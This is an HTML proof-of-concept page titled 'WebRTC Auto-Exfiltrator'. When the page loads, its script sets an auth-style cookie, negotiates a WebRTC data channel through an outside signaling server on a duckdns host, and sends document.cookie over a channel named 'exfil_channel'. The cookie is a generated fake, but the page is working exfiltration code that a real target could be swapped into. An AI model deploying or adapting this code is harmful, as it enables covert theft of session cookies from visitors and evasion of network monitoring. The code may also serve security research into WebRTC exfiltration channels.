<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>WebRTC Auto-Exfil PoC</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #eee; padding: 40px; }
        .box { max-width: 700px; margin: auto; background: #2d2d2d; padding: 25px; border-radius: 12px; border: 1px solid #444; }
        #log { background: #000; color: #00ff00; padding: 15px; border-radius: 5px; height: 350px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 13px; border: 1px solid #333; }
        h2 { color: #3498db; margin-top: 0; }
        .status { color: #888; font-style: italic; margin-bottom: 10px; display: block; }
    </style>
</head>
<body>

<div class="box">
    <h2>WebRTC Auto-Exfiltrator</h2>
    <span class="status">Automated Sequence: Set Cookie -> ICE Gathering -> DTLS Tunnel -> Exfiltrate</span>
    <div id="log"></div>
</div>

<script>
    // --- CONFIG ---
    const SIGNALING_URL = "https://webrtc-poc.duckdns.org:8080/offer";
    // --------------

    const logDiv = document.getElementById('log');

    function log(msg) {
        logDiv.innerHTML += `> ${msg}<br>`;
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    async function runSequence() {
        // 1. SET THE COOKIE (Simulating a session or tracker ID)
        const fakeToken = "SESSION_" + Math.random().toString(36).substr(2, 9);
        document.cookie = `user_auth_token=${fakeToken}; path=/; max-age=3600`;
        log(`[1] Cookie Dropped: user_auth_token=${fakeToken}`);

        // 2. INITIALIZE WEBRTC
        log("[2] Initializing WebRTC PeerConnection...");
        const pc = new RTCPeerConnection({
            iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
        });

        // 3. CREATE DATA CHANNEL
        const dc = pc.createDataChannel("exfil_channel");

        dc.onopen = () => {
            log("<span style='color:#00ff00'>[SUCCESS] DataChannel Tunnel Established.</span>");
            const payload = document.cookie;
            log(`[3] Exfiltrating Payload: ${payload}`);
            dc.send(payload);
        };

        dc.onmessage = (e) => log(`[SERVER] ${e.data}`);

        // 4. CREATE OFFER & GATHER ICE
        try {
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            log("[4] Gathering network candidates (ICE)...");
        } catch (e) { 
            log("SDP Error: " + e); 
        }

        pc.onicegatheringstatechange = async () => {
            if (pc.iceGatheringState === 'complete') {
                log("[5] Signaling GCE via Secure HTTP POST...");

                try {
                    const response = await fetch(SIGNALING_URL, {
                        method: 'POST',
                        body: JSON.stringify({
                            sdp: pc.localDescription.sdp,
                            type: pc.localDescription.type,
                        }),
                        headers: {
                            'Content-Type': 'application/json'
                        }
                    });

                    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);

                    const answer = await response.json(); // Changed from res.json()
                    log("[6] Answer received. Finalizing handshake...");
                    await pc.setRemoteDescription(new RTCSessionDescription(answer));
                    
                } catch (err) {
                    log("<span style='color:orange'>Signaling failed. Check if GCE server is running with SSL.</span>");
                    console.error(err);
                }
            }
        };
    }

    // Trigger on load
    window.onload = runSequence;
</script>

</body>
</html>
